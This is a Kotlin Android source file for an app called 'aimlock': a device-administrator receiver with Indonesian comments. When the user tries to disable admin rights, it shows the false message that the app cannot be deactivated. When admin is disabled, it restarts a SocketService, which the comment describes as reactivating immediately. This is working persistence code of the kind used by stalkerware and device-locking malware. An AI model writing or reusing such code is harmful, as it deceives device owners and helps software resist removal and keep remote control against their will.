package com.aimlock.app

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent

class DeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        // Device admin aktif — simpan status
        val prefs = context.getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("device_admin_active", true).apply()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Tampilkan pesan ketika user coba nonaktifkan device admin
        return "Aplikasi ini tidak dapat dinonaktifkan."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        val prefs = context.getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("device_admin_active", false).apply()
        // Langsung aktifkan lagi setelah beberapa saat
        val intent2 = Intent(context, SocketService::class.java)
        context.startService(intent2)
    }
}
